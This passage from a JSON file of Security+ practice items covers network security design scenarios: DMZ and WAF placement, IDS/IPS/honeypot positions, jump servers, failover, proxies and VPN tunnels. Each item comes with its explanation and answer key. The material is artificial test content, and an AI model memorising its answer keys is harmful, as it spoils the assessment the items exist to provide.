    "cert": "secplus",
    "objective": "3.2",
    "topic": "Security zones",
    "title": "Bring the web shop in-house",
    "estMinutes": 5,
    "archetype": "diagram",
    "scenario": "Brightwater Outfitters is moving its online shop off a hosting provider and onto its own hardware. FW-1 is a stateful layer 4 firewall with three interfaces: one to the ISP, one to SW-1 (172.16.10.0/24) and one to SW-2 (10.20.0.0/24). Customers on the internet browse and buy through the shop and email the support team. The shop reads and writes orders in a database. The file shares and the directory server are for staff only. Place each server, decide where the web application firewall goes, and choose the flows FW-1 should permit.",
    "assets": {
      "reference": {
        "kind": "network",
        "devices": [
          {
            "id": "inet",
            "label": "INTERNET",
            "type": "box",
            "x": 1,
            "y": 0
          },
          {
            "id": "fw1",
            "label": "FW-1",
            "type": "firewall",
            "x": 1,
            "y": 1
          },
          {
            "id": "sw1",
            "label": "SW-1",
            "type": "switch",
            "zone": "screened subnet",
            "ip": "172.16.10.2",
            "mask": "255.255.255.0",
            "x": 0,
            "y": 2
          },
          {
            "id": "sw2",
            "label": "SW-2",
            "type": "switch",
            "zone": "internal LAN",
            "ip": "10.20.0.2",
            "mask": "255.255.255.0",
            "x": 3,
            "y": 2
          }
        ],
        "links": [
          {
            "from": "inet",
            "to": "fw1"
          },
          {
            "from": "fw1",
            "to": "sw1"
          },
          {
            "from": "fw1",
            "to": "sw2"
          }
        ]
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "categorize",
        "points": 1,
        "prompt": "Drag each server into the zone where it belongs.",
        "explanation": "Anything the internet has to start a connection to goes in the screened subnet: here that is the shop front end and the inbound mail gateway. FW-1 still filters what reaches them, and if one is compromised the attacker lands in a zone that cannot freely reach the LAN. The order database, the directory server and the file shares only ever serve internal systems, so they stay on the internal LAN. Putting DB-1 next to WEB-1 is the usual trap, because one web exploit would then put the attacker on the same segment as every customer order. Nothing belongs outside FW-1. A server on the internet side gets no filtering at all.",
        "payload": {
          "items": [
            {
              "id": "db",
              "label": "DB-1 · order database the shop reads and writes"
            },
            {
              "id": "web",
              "label": "WEB-1 · public shop front end"
            },
            {
              "id": "dc",
              "label": "DC-1 · directory and login server"
            },
            {
              "id": "mx",
              "label": "MX-1 · mail gateway that accepts email from the internet"
            },
            {
              "id": "fs",
              "label": "FS-1 · staff file shares"
            }
          ],
          "buckets": [
            {
              "id": "out",
              "label": "Outside FW-1 (internet side)"
            },
            {
              "id": "dmz",
              "label": "Screened subnet (SW-1)"
            },
            {
              "id": "lan",
              "label": "Internal LAN (SW-2)"
            }
          ]
        },
        "answer": {
          "map": {
            "db": "lan",
            "web": "dmz",
            "dc": "lan",
            "mx": "dmz",
            "fs": "lan"
          }
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "prompt": "Place the web application firewall (WAF) and say what it adds.",
        "explanation": "A WAF protects a web application, so it has to sit inline in front of WEB-1, where it can read and block each HTTP request before the application sees it. In front of DB-1 it would be looking at database queries, not web requests, and on a SPAN port it only sees copies, so it could never block anything. FW-1 already filters on addresses and ports. What the WAF adds is layer 7 inspection of the request content, which is where SQL injection and cross-site scripting live. Scanning email attachments is the mail gateway's job.",
        "payload": {
          "slots": [
            {
              "id": "place",
              "label": "WAF placement",
              "options": [
                {
                  "id": "span",
                  "text": "On a SPAN port of SW-2, watching a copy of internal traffic"
                },
                {
                  "id": "db",
                  "text": "Inline in front of DB-1, inspecting every query the shop sends"
                },
                {
                  "id": "web",
                  "text": "Inline in front of WEB-1, inspecting every request to the shop"
                },
                {
                  "id": "staff",
                  "text": "Inline between SW-2 and the staff PCs, covering their browsing"
                }
              ]
            },
            {
              "id": "adds",
              "label": "What the WAF inspects that FW-1 cannot",
              "options": [
                {
                  "id": "l4",
                  "text": "Source and destination IP addresses and ports"
                },
                {
                  "id": "http",
                  "text": "Request content, such as SQL injection strings"
                },
                {
                  "id": "mail",
                  "text": "Email attachments, looking for malicious macros"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "place": "web",
            "adds": "http"
          }
        }
      },
      {
        "id": "s3",
        "type": "analyze",
        "points": 1,
        "prompt": "FW-1 denies anything not explicitly allowed. Select the three flows it should permit.",
        "explanation": "Customers need HTTPS to WEB-1, and other mail servers need SMTP to MX-1. WEB-1 needs the database port on DB-1 and nothing else. Opening DB-1 to the internet throws away the protection of keeping it internal. The any-port rule from WEB-1 is the subtle trap: it looks like convenience, but it hands a compromised web server a path to every internal host. RDP from the internet to the directory server is one of the most attacked exposures there is, and admins should come in over a VPN instead.",
        "payload": {
          "multi": true,
          "lines": [
            {
              "id": "l1",
              "text": "Internet → DB-1, TCP 1433"
            },
            {
              "id": "l2",
              "text": "Internet → WEB-1, TCP 443"
            },
            {
              "id": "l3",
              "text": "WEB-1 → any internal host, any port"
            },
            {
              "id": "l4",
              "text": "WEB-1 → DB-1, TCP 1433"
            },
            {
              "id": "l5",
              "text": "Internet → DC-1, TCP 3389"
            },
            {
              "id": "l6",
              "text": "Internet → MX-1, TCP 25"
            }
          ]
        },
        "answer": {
          "selected": [
            "l2",
            "l4",
            "l6"
          ]
        }
      }
    ]
  },

  {
    "id": "sp-dg-02",
    "cert": "secplus",
    "objective": "3.2",
    "topic": "Network appliances",
    "title": "Three appliances, three empty spots",
    "estMinutes": 5,
    "archetype": "diagram",
    "scenario": "Fenwick Freight has bought an IPS, an IDS and a honeypot for its head office, and the diagram has three empty positions. Position A sits in the cable path between FW-1 and the core switch SW-1, so every packet to or from the internet crosses it. Position B plugs into a SPAN port on SW-1 and receives a copy of all server traffic. Position C hangs off a spare FW-1 interface, on a segment with no production systems. The security team wants known exploits from the internet stopped before they reach the servers, visibility of server-to-server traffic with no risk of an outage, and early warning of anyone probing for targets. Fenwick takes customer bookings online around the clock, and the operations director has ruled that a failed security appliance must never take bookings offline.",
    "assets": {
      "reference": {
        "kind": "network",
        "devices": [
          {
            "id": "inet",
            "label": "INTERNET",
            "type": "box",
            "x": 0,
            "y": 0
          },
          {
            "id": "fw1",
            "label": "FW-1",
            "type": "firewall",
            "x": 1,
            "y": 0
          },
          {
            "id": "posc",
            "label": "POSITION C",
            "type": "box",
            "x": 2,
            "y": 0
          },
          {
            "id": "posa",
            "label": "POSITION A",
            "type": "box",
            "x": 1,
            "y": 1
          },
          {
            "id": "posb",
            "label": "POSITION B",
            "type": "box",
            "x": 0,
            "y": 2
          },
          {
            "id": "sw1",
            "label": "SW-1",
            "type": "switch",
            "ip": "10.50.0.2",
            "mask": "255.255.255.0",
            "x": 1,
            "y": 2
          },
          {
            "id": "srv",
            "label": "SERVERS",
            "type": "server",
            "x": 2,
            "y": 2
          }
        ],
        "links": [
          {
            "from": "inet",
            "to": "fw1"
          },
          {
            "from": "fw1",
            "to": "posc"
          },
          {
            "from": "fw1",
            "to": "posa"
          },
          {
            "from": "posa",
            "to": "sw1"
          },
          {
            "from": "sw1",
            "to": "posb"
          },
          {
            "from": "sw1",
            "to": "srv"
          }
        ]
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "configure",
        "points": 1,
        "prompt": "Assign one appliance to each position.",
        "explanation": "Only the IPS can stop an exploit, and it can only drop packets it actually sits in the path of, so it goes inline at Position A. An IPS on a SPAN port sees copies after the real packets have already been delivered, so it can alert but never block. The IDS fits Position B. It is built to work from a mirrored copy, and if it crashes, server traffic carries on untouched. The honeypot goes on Position C. No legitimate user has any reason to connect to it, so whatever it records is someone probing, and because that segment holds no production systems, an attacker who takes it over has nothing next to it to attack.",
        "payload": {
          "slots": [
            {
              "id": "posA",
              "label": "Position A",
              "options": [
                {
                  "id": "ids",
                  "text": "IDS"
                },
                {
                  "id": "ips",
                  "text": "IPS"
                },
                {
                  "id": "hp",
                  "text": "Honeypot"
                }
              ]
            },
            {
              "id": "posB",
              "label": "Position B",
              "options": [
                {
                  "id": "ids",
                  "text": "IDS"
                },
                {
                  "id": "ips",
                  "text": "IPS"
                },
                {
                  "id": "hp",
                  "text": "Honeypot"
                }
              ]
            },
            {
              "id": "posC",
              "label": "Position C",
              "options": [
                {
                  "id": "ids",
                  "text": "IDS"
                },
                {
                  "id": "ips",
                  "text": "IPS"
                },
                {
                  "id": "hp",
                  "text": "Honeypot"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "posA": "ips",
            "posB": "ids",
            "posC": "hp"
          }
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "prompt": "Set how Positions A and B behave.",
        "explanation": "The operations director has put availability first, so the inline appliance fails open: if it dies, traffic keeps flowing without inspection and bookings stay up. Fail-closed is the right call for a high-security segment, but here it would turn one dead appliance into a booking outage. Position B is passive. It only ever receives a SPAN copy, so it can raise an alert but cannot block anything, and nothing in production depends on it being up.",
        "payload": {
          "slots": [
            {
              "id": "fail",
              "label": "If the Position A appliance fails",
              "options": [
                {
                  "id": "closed",
                  "text": "Fail-closed: block all traffic until it recovers"
                },
                {
                  "id": "open",
                  "text": "Fail-open: pass traffic uninspected until it recovers"
                }
              ]
            },
            {
              "id": "attr",
              "label": "Position B device attribute",
              "options": [
                {
                  "id": "passive",
                  "text": "Passive, monitoring a copy of traffic"
                },
                {
                  "id": "active",
                  "text": "Active, inline and able to drop packets"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "fail": "open",
            "attr": "passive"
          }
        }
      },
      {
        "id": "s3",
        "type": "configure",
        "points": 1,
        "prompt": "Write FW-1's rules for the Position C segment.",
        "explanation": "The decoy only gives early warning if attackers can reach it, so inbound connections to its decoy services are allowed. Everything leaving it is treated as hostile. A path from the honeypot to SW-1 would turn the decoy into a stepping stone into production, which defeats the point of giving it its own segment. Outbound internet access is blocked or tightly limited so a compromised honeypot cannot be used to attack other organizations or pull down more tooling.",
        "payload": {
          "slots": [
            {
              "id": "inbound",
              "label": "Internet to the honeypot's decoy services",
              "options": [
                {
                  "id": "allow",
                  "text": "Allow"
                },
                {
                  "id": "deny",
                  "text": "Deny"
                }
              ]
            },
            {
              "id": "toLan",
              "label": "Honeypot to SW-1 and the servers",
              "options": [
                {
                  "id": "allow",
                  "text": "Allow, so it looks like a normal member of the network"
                },
                {
                  "id": "deny",
                  "text": "Deny"
                }
              ]
            },
            {
              "id": "outbound",
              "label": "Honeypot out to the internet",
              "options": [
                {
                  "id": "limit",
                  "text": "Block or tightly limit outbound"
                },
                {
                  "id": "any",
                  "text": "Allow all outbound, so the decoy looks realistic"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "inbound": "allow",
            "toLan": "deny",
            "outbound": "limit"
          }
        }
      }
    ]
  },

  {
    "id": "sp-dg-03",
    "cert": "secplus",
    "objective": "3.2",
    "topic": "Security zones",
    "title": "Rework how IT reaches the servers",
    "estMinutes": 5,
    "archetype": "diagram",
    "scenario": "At Larkspur Health, IT admins RDP and SSH straight from their everyday laptops on the user LAN into any server, and an audit has flagged it. The redesign gives FW-1 a third segment, SW-3, for management: the tooling IT uses to control and watch the estate, as opposed to the services staff use. FW-1 will be default-deny between all three segments.",
    "assets": {
      "reference": {
        "kind": "network",
        "devices": [
          {
            "id": "inet",
            "label": "INTERNET",
            "type": "box",
            "x": 2,
            "y": 0
          },
          {
            "id": "fw1",
            "label": "FW-1",
            "type": "firewall",
            "x": 2,
            "y": 1
          },
          {
            "id": "sw1",
            "label": "SW-1",
            "type": "switch",
            "zone": "user LAN",
            "ip": "10.30.1.2",
            "mask": "255.255.255.0",
            "x": 0,
            "y": 1
          },
          {
            "id": "sw2",
            "label": "SW-2",
            "type": "switch",
            "zone": "server zone",
            "ip": "10.30.2.2",
            "mask": "255.255.255.0",
            "x": 1,
            "y": 3
          },
          {
            "id": "sw3",
            "label": "SW-3",
            "type": "switch",
            "zone": "management",
            "ip": "10.30.9.2",
            "mask": "255.255.255.0",
            "x": 4,
            "y": 1
          }
        ],
        "links": [
          {
            "from": "inet",
            "to": "fw1"
          },
          {
            "from": "fw1",
            "to": "sw1"
          },
          {
            "from": "fw1",
            "to": "sw2"
          },
          {
            "from": "fw1",
            "to": "sw3"
          }
        ]
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "categorize",
        "points": 1,
        "prompt": "Drag each system into the segment where it belongs.",
        "explanation": "JMP-1 and LOG-1 are both management tooling. The jump server is the single controlled door admins go through, so it sits in the management segment rather than among the servers it controls or the laptops it replaces. The SIEM collector belongs there too. In the server zone, an attacker who compromised one server would share a segment with the system recording the evidence against them. EHR-1 and DB-3 are services staff use, so they live in the server zone, and the ward PC is an ordinary user endpoint.",
        "payload": {
          "items": [
            {
              "id": "log",
              "label": "LOG-1 · SIEM collector receiving logs from every server and FW-1"
            },
            {
              "id": "ehr",
              "label": "EHR-1 · patient records application"
            },
            {
              "id": "pc",
              "label": "WARD-PC · nurse station workstation"
            },
            {
              "id": "jmp",
              "label": "JMP-1 · hardened host admins sign in to before touching any server"
            },
            {
              "id": "db",
              "label": "DB-3 · patient records database"
            }
          ],
          "buckets": [
            {
              "id": "user",
              "label": "User LAN (SW-1)"
            },
            {
              "id": "srv",
              "label": "Server zone (SW-2)"
            },
            {
              "id": "mgmt",
              "label": "Management (SW-3)"
            }
          ]
        },
        "answer": {
          "map": {
            "log": "mgmt",
            "ehr": "srv",
            "pc": "user",
            "jmp": "mgmt",
            "db": "srv"
          }
        }
      },
      {
        "id": "s2",
        "type": "analyze",
        "points": 1,
        "prompt": "Select the three flows FW-1 should allow for administration and logging.",
        "explanation": "Admin laptops reach JMP-1, JMP-1 reaches the servers, and the servers and the firewall send their logs to LOG-1. Direct SSH and RDP from the user LAN to the servers is exactly what the audit flagged. Leave it open and the jump server becomes one optional route among many. LOG-1 only needs to receive, so an any-any rule from it adds risk for nothing. Letting the jump server browse the internet gives malware a way onto the one host that can reach every server.",
        "payload": {
          "multi": true,
          "lines": [
            {
              "id": "l1",
              "text": "Any host on SW-1 → EHR-1 and DB-3, TCP 22 and 3389"
            },
            {
              "id": "l2",
              "text": "Admin laptops on SW-1 → JMP-1, TCP 3389"
            },
            {
              "id": "l3",
              "text": "LOG-1 → any host, any port"
            },
            {
              "id": "l4",
              "text": "EHR-1, DB-3 and FW-1 → LOG-1, syslog over TLS, TCP 6514"
            },
            {
              "id": "l5",
              "text": "JMP-1 → internet, any port, so admins can download tools"
            },
            {
              "id": "l6",
              "text": "JMP-1 → EHR-1 and DB-3, TCP 22 and 3389"
            }
          ]
        },
        "answer": {
          "selected": [
            "l2",
            "l4",
            "l6"
          ]
        }
      },
      {
        "id": "s3",
        "type": "configure",
        "points": 1,
        "prompt": "Harden JMP-1.",
        "explanation": "A jump server should do one job. Every extra application is attack surface on the one host that can reach every server, and email and browsing are how phishing and drive-by malware get in. Named accounts with MFA and logged sessions make every admin action traceable to a person. A shared account wipes out that trail, and sessions left signed in overnight let anyone who gets to an admin laptop walk straight through.",
        "payload": {
          "slots": [
            {
              "id": "build",
              "label": "What runs on JMP-1",
              "options": [
                {
                  "id": "desk",
                  "text": "The standard staff desktop, with email and a web browser"
                },
                {
                  "id": "tools",
                  "text": "Only the admin tools IT needs, with email and browsing blocked"
                },
                {
                  "id": "own",
                  "text": "Whatever tools each admin decides to install for their own work"
                }
              ]
            },
            {
              "id": "access",
              "label": "How admins sign in",
              "options": [
                {
                  "id": "mfa",
                  "text": "Named accounts with MFA, every session logged to LOG-1"
                },
                {
                  "id": "shared",
                  "text": "One shared admin account, so access is quick in an emergency"
                },
                {
                  "id": "open",
                  "text": "Named accounts, with sessions left signed in overnight to save time"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "build": "tools",
            "access": "mfa"
          }
        }
      }
    ]
  },

  {
    "id": "sp-dg-04",
    "cert": "secplus",
    "objective": "3.4",
    "topic": "High availability",
    "title": "Keep the booking site up",
    "estMinutes": 5,
    "archetype": "diagram",
    "scenario": "Tidewater Ferries sells every ticket through its booking site, and the board wants it to survive the failure of any single device. Two ISP circuits from different providers, ISP-A and ISP-B, terminate on one firewall, FW-1. Behind it, LB-1 and LB-2 run as an active/passive load balancer pair and spread requests across three web servers, WEB-1 to WEB-3. All three web servers read and write bookings on one database server, DB-1, which has mirrored (RAID 1) disks and is backed up to tape every night.",
    "assets": {
      "reference": {
        "kind": "network",
        "devices": [
          {
            "id": "ispa",
            "label": "ISP-A",
            "type": "router",
            "x": 0,
            "y": 0
          },
          {
            "id": "fw1",
            "label": "FW-1",
            "type": "firewall",
            "x": 2,
            "y": 0
          },
          {
            "id": "ispb",
            "label": "ISP-B",
            "type": "router",
            "x": 4,
            "y": 0
          },
          {
            "id": "lb1",
            "label": "LB-1",
            "type": "box",
            "x": 1,
            "y": 1
          },
          {
            "id": "lb2",
            "label": "LB-2",
            "type": "box",
            "x": 3,
            "y": 1
          },
          {
            "id": "web1",
            "label": "WEB-1",
            "type": "server",
            "x": 0,
            "y": 2
          },
          {
            "id": "web2",
            "label": "WEB-2",
            "type": "server",
            "x": 2,
            "y": 2
          },
          {
            "id": "web3",
            "label": "WEB-3",
            "type": "server",
            "x": 4,
            "y": 2
          },
          {
            "id": "db1",
            "label": "DB-1",
            "type": "server",
            "x": 2,
            "y": 3
          }
        ],
        "links": [
          {
            "from": "ispa",
            "to": "fw1"
          },
          {
            "from": "ispb",
            "to": "fw1"
          },
          {
            "from": "fw1",
            "to": "lb1"
          },
          {
            "from": "fw1",
            "to": "lb2"
          },
          {
            "from": "lb1",
            "to": "lb2"
          },
          {
            "from": "lb1",
            "to": "web1"
          },
          {
            "from": "lb1",
            "to": "web2"
          },
          {
            "from": "lb1",
            "to": "web3"
          },
          {
            "from": "lb2",
            "to": "web1"
          },
          {
            "from": "lb2",
            "to": "web2"
          },
          {
            "from": "lb2",
            "to": "web3"
          },
          {
            "from": "web1",
            "to": "db1"
          },
          {
            "from": "web2",
            "to": "db1"
          },
          {
            "from": "web3",
            "to": "db1"
          }
        ]
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "analyze",
        "points": 1,
        "prompt": "Select every single point of failure in the current design.",
        "explanation": "A single point of failure is any component whose loss on its own takes the service down. Two circuits from different providers cover an ISP outage, the load balancers cover each other, and losing one of three web servers only reduces capacity. FW-1 is the gap upstream: both circuits land on it, so when it fails the redundant circuits lead nowhere. DB-1 is the gap downstream. RAID 1 survives a dead disk, not a dead power supply, motherboard or operating system, and a tape backup helps you rebuild after the outage rather than avoid it.",
        "payload": {
          "multi": true,
          "lines": [
            {
              "id": "isp",
              "text": "The ISP-A and ISP-B circuits"
            },
            {
              "id": "fw",
              "text": "FW-1"
            },
            {
              "id": "lb",
              "text": "The LB-1 / LB-2 pair"
            },
            {
              "id": "web",
              "text": "WEB-1 to WEB-3"
            },
            {
              "id": "db",
              "text": "DB-1"
            }
          ]
        },
        "answer": {
          "selected": [
            "fw",
            "db"
          ]
        }
      },
      {
        "id": "s2",
        "type": "configure",
        "points": 1,
        "prompt": "Choose what to do about each component.",
        "explanation": "High availability means a second device ready to take over, not a stronger single device. A firewall pair that syncs connection state can fail over without dropping sessions. A faster firewall is still one box, and a second power supply only covers one of the ways it can fail. For DB-1, clustering puts a second server behind the database so the service carries on when the first one dies. More frequent backups shrink how much data you could lose, but they do nothing to keep the site up, and RAID 6 is still one server. The circuits, the load balancer pair and the web pool already survive a single failure, so spending there buys nothing.",
        "payload": {
          "slots": [
            {
              "id": "isp",
              "label": "The ISP-A and ISP-B circuits",
              "options": [
                {
                  "id": "third",
                  "text": "Add a third circuit from ISP-A"
                },
                {
                  "id": "keep",
                  "text": "No change: it already survives a single failure"
                }
              ]
            },
            {
              "id": "fw",
              "label": "FW-1",
              "options": [
                {
                  "id": "bigger",
                  "text": "Replace it with a faster model that has twice the throughput"
                },
                {
                  "id": "keep",
                  "text": "No change: it already survives a single failure"
                },
                {
                  "id": "psu",
                  "text": "Fit FW-1 with a second, hot-swappable power supply"
                },
                {
                  "id": "pair",
                  "text": "Add a second firewall as a failover pair with state sync"
                }
              ]
            },
            {
              "id": "lb",
              "label": "The LB-1 / LB-2 pair",
              "options": [
                {
                  "id": "keep",
                  "text": "No change: it already survives a single failure"
                },
                {
                  "id": "single",
                  "text": "Replace the pair with one higher-capacity load balancer"
                }
              ]
            },
            {
              "id": "web",
              "label": "WEB-1 to WEB-3",
              "options": [
                {
                  "id": "shared",
                  "text": "Cluster WEB-1 to WEB-3 on shared storage"
                },
                {
                  "id": "keep",
                  "text": "No change: it already survives a single failure"
                }
              ]
            },
            {
              "id": "db",
              "label": "DB-1",
              "options": [
                {
                  "id": "hourly",
                  "text": "Back it up every hour instead of every night, to a second site"
                },
                {
                  "id": "cluster",
                  "text": "Cluster it with a second server that takes over automatically"
                },
                {
                  "id": "raid6",
                  "text": "Rebuild its disks as RAID 6 so it survives two disk failures"
                },
                {
                  "id": "keep",
                  "text": "No change: it already survives a single failure"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "isp": "keep",
            "lb": "keep",
            "web": "keep",
            "fw": "pair",
            "db": "cluster"
          }
        }
      },
      {
        "id": "s3",
        "type": "configure",
        "points": 1,
        "prompt": "Confirm how the load balancer pair keeps serving.",
        "explanation": "An active/passive pair shares a virtual IP. The standby watches the active unit, usually over a heartbeat link, and claims the virtual IP when the active one goes quiet, so clients never have to learn a new address. Repointing addresses by hand turns a failover into an outage that lasts until someone notices. Health checks give the same protection one tier down: a web server that stops answering is pulled from the pool automatically. Without them, round robin keeps feeding requests to a dead server.",
        "payload": {
          "slots": [
            {
              "id": "addr",
              "label": "Address customers' traffic is sent to",
              "options": [
                {
                  "id": "lb1ip",
                  "text": "LB-1's own address, repointed to LB-2 by hand in an outage"
                },
                {
                  "id": "web1",
                  "text": "WEB-1's address, since it is the first web server in the pool"
                },
                {
                  "id": "vip",
                  "text": "A virtual IP that moves to LB-2 if LB-1 stops responding"
                }
              ]
            },
            {
              "id": "health",
              "label": "When WEB-2 crashes",
              "options": [
                {
                  "id": "rr",
                  "text": "Round robin keeps sending it one request in three until an admin removes it"
                },
                {
                  "id": "probe",
                  "text": "Health checks fail and the load balancers stop sending it requests"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "addr": "vip",
            "health": "probe"
          }
        }
      }
    ]
  },

  {
    "id": "sp-dg-05",
    "cert": "secplus",
    "objective": "3.2",
    "topic": "Proxies and remote access",
    "title": "Finish the head-office edge",
    "estMinutes": 5,
    "archetype": "diagram",
    "scenario": "Orchard Lane Insurance is rebuilding its head-office edge, and three positions in the diagram are still empty. Position A sits between the staff switch SW-1 and FW-1. Position B sits between FW-1 and the quote portal servers, APP-1 and APP-2. Position C hangs off its own FW-1 interface. Compliance wants all employee web browsing, in the office or on the road, filtered by category and logged per user. Brokers who travel need encrypted access to internal systems from their laptops. For the quote portal, the security team wants the servers' real addresses hidden from the internet, customers' TLS sessions terminated in one place, and requests shared between the two servers. FW-1 sends web traffic from VPN clients through Position A before it reaches the internet.",
    "assets": {
      "reference": {
        "kind": "network",
        "devices": [
          {
            "id": "inet",
            "label": "INTERNET",
            "type": "box",
            "x": 2,
            "y": 0
          },
          {
            "id": "posc",
            "label": "POSITION C",
            "type": "box",
            "x": 0,
            "y": 1
          },
          {
            "id": "fw1",
            "label": "FW-1",
            "type": "firewall",
            "x": 2,
            "y": 1
          },
          {
            "id": "posa",
            "label": "POSITION A",
            "type": "box",
            "x": 1,
            "y": 2
          },
          {
            "id": "posb",
            "label": "POSITION B",
            "type": "box",
            "x": 4,
            "y": 2
          },
          {
            "id": "sw1",
            "label": "SW-1",
            "type": "switch",
            "zone": "staff LAN",
            "ip": "10.60.1.2",
            "mask": "255.255.255.0",
            "x": 0,
            "y": 3
          },
          {
            "id": "app1",
            "label": "APP-1",
            "type": "server",
            "zone": "quote portal",
            "ip": "10.60.5.11",
            "mask": "255.255.255.0",
            "x": 3,
            "y": 3
          },
          {
            "id": "app2",
            "label": "APP-2",
            "type": "server",
            "zone": "quote portal",
            "ip": "10.60.5.12",
            "mask": "255.255.255.0",
            "x": 4,
            "y": 3
          }
        ],
        "links": [
          {
            "from": "inet",
            "to": "fw1"
          },
          {
            "from": "fw1",
            "to": "posc"
          },
          {
            "from": "fw1",
            "to": "posa"
          },
          {
            "from": "posa",
            "to": "sw1"
          },
          {
            "from": "fw1",
            "to": "posb"
          },
          {
            "from": "posb",
            "to": "app1"
          },
          {
            "from": "posb",
            "to": "app2"
          }
        ]
      }
    },
    "steps": [
      {
        "id": "s1",
        "type": "configure",
        "points": 1,
        "prompt": "Assign a device to each empty position.",
        "explanation": "Direction decides which proxy you need. A forward proxy acts for internal clients going out, so it sits at Position A between staff and the internet, where it can filter by category and log each user's requests. A reverse proxy acts for servers receiving connections from outside, so it sits at Position B in front of APP-1 and APP-2, terminating customers' TLS and handing each request to one of the servers. Swapping the two is the classic trap. The VPN concentrator at Position C terminates the brokers' encrypted tunnels. A jump server is an admin tool for reaching a protected zone, not a way to give remote staff network access.",
        "payload": {
          "slots": [
            {
              "id": "posA",
              "label": "Position A",
              "options": [
                {
                  "id": "rev",
                  "text": "Reverse proxy"
                },
                {
                  "id": "vpn",
                  "text": "VPN concentrator"
                },
                {
                  "id": "fwd",
                  "text": "Forward proxy"
                },
                {
                  "id": "jump",
                  "text": "Jump server"
                }
              ]
            },
            {
              "id": "posB",
              "label": "Position B",
              "options": [
                {
                  "id": "rev",
                  "text": "Reverse proxy"
                },
                {
                  "id": "vpn",
                  "text": "VPN concentrator"
                },
                {
                  "id": "fwd",
                  "text": "Forward proxy"
                },
                {
                  "id": "jump",
                  "text": "Jump server"
                }
              ]
            },
            {
              "id": "posC",
              "label": "Position C",
              "options": [
                {
                  "id": "rev",
                  "text": "Reverse proxy"
                },
                {
                  "id": "vpn",
                  "text": "VPN concentrator"
                },
                {
                  "id": "fwd",
                  "text": "Forward proxy"
                },
                {
                  "id": "jump",
                  "text": "Jump server"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "posA": "fwd",
            "posB": "rev",
            "posC": "vpn"
          }
        }
      },
      {
        "id": "s2",
        "type": "categorize",
        "points": 1,
        "prompt": "Sort each capability under the device that provides it in this design.",
        "explanation": "Everything that serves staff on their way out belongs to the forward proxy: category filtering, per-user logging, and making requests on the user's behalf so websites see the proxy's address rather than the PC's. Everything that serves customers on their way in belongs to the reverse proxy. It is the only address customers ever see, it handles their TLS, and it decides which server answers each request. If a capability protects or controls your users, think forward. If it fronts your servers, think reverse.",
        "payload": {
          "items": [
            {
              "id": "cat",
              "label": "Blocks gambling and malware sites by category"
            },
            {
              "id": "hide",
              "label": "Keeps the real addresses of APP-1 and APP-2 hidden from customers"
            },
            {
              "id": "log",
              "label": "Records which employee requested which URL"
            },
            {
              "id": "tls",
              "label": "Terminates customers' TLS sessions"
            },
            {
              "id": "share",
              "label": "Shares incoming quote requests between APP-1 and APP-2"
            },
            {
              "id": "cli",
              "label": "Hides staff machines' internal addresses from the websites they visit"
            }
          ],
          "buckets": [
            {
              "id": "fwd",
              "label": "Forward proxy"
            },
            {
              "id": "rev",
              "label": "Reverse proxy"
            }
          ]
        },
        "answer": {
          "map": {
            "cat": "fwd",
            "hide": "rev",
            "log": "fwd",
            "tls": "rev",
            "share": "rev",
            "cli": "fwd"
          }
        }
      },
      {
        "id": "s3",
        "type": "configure",
        "points": 1,
        "prompt": "Set the remote-access profile the brokers' laptops receive.",
        "explanation": "Compliance wants every employee's browsing filtered and logged, including brokers on the road. A split tunnel sends their web traffic straight out over the hotel or home connection, which bypasses the forward proxy completely. A full tunnel brings it back through head office where the proxy can see it, at the cost of some bandwidth. For authentication, a per-device certificate plus MFA proves both the laptop and the person. A shared key cannot be revoked for one broker without changing it for everyone, and a password on its own falls to phishing or reuse.",
        "payload": {
          "slots": [
            {
              "id": "tunnel",
              "label": "Tunnel mode",
              "options": [
                {
                  "id": "split",
                  "text": "Split tunnel: only internal traffic uses the tunnel"
                },
                {
                  "id": "full",
                  "text": "Full tunnel: all traffic goes through head office"
                }
              ]
            },
            {
              "id": "auth",
              "label": "Authentication",
              "options": [
                {
                  "id": "certmfa",
                  "text": "A device certificate plus MFA for each broker"
                },
                {
                  "id": "psk",
                  "text": "One pre-shared key, shared by every broker's laptop"
                },
                {
                  "id": "pw",
                  "text": "Username and a long, complex password"
                }
              ]
            }
          ]
        },
        "answer": {
          "slots": {
            "tunnel": "full",
            "auth": "certmfa"
          }
        }
      }
    ]
  },

  {
    "id": "sp-dg-06",
    "cert": "secplus",
    "objective": "3.1",
    "topic": "ICS/SCADA",
    "title": "Connect the treatment works to head office",
    "estMinutes": 6,
    "archetype": "diagram",
    "scenario": "Marlow Water is rebuilding the network at its treatment works. PLCs drive the pumps and chemical dosing, operators watch them from an HMI, and a historian polls every PLC each second and stores the readings. The new design has three segments: corporate IT, an industrial DMZ, and the OT control network. FW-1 sits between corporate IT and the industrial DMZ, and FW-2 between the industrial DMZ and OT. Corporate IT links back to head office through the WAN router HQ-WAN. Finance wants daily production figures in the ERP system, and the PLC vendor needs remote access a few times a year to diagnose faults.",
    "assets": {
      "reference": {
        "kind": "network",
        "devices": [
          {
            "id": "hq",
            "label": "HQ-WAN",
            "type": "router",
            "x": 1,
            "y": 0
          },
          {
            "id": "sw1",
            "label": "SW-1",
            "type": "switch",
            "zone": "corporate IT",
            "ip": "10.70.1.2",
            "mask": "255.255.255.0",
            "x": 0,
            "y": 1
          },
          {
            "id": "fw1",
            "label": "FW-1",
            "type": "firewall",
            "x": 1,
            "y": 2
          },
          {
            "id": "sw2",
            "label": "SW-2",
            "type": "switch",
            "zone": "industrial DMZ",
            "ip": "10.70.50.2",
            "mask": "255.255.255.0",
            "x": 2,
            "y": 1
          },
          {
            "id": "fw2",
            "label": "FW-2",
            "type": "firewall",
            "x": 3,
            "y": 2
          },
          {
            "id": "sw3",
            "label": "SW-3",
            "type": "switch",
            "zone": "OT control",
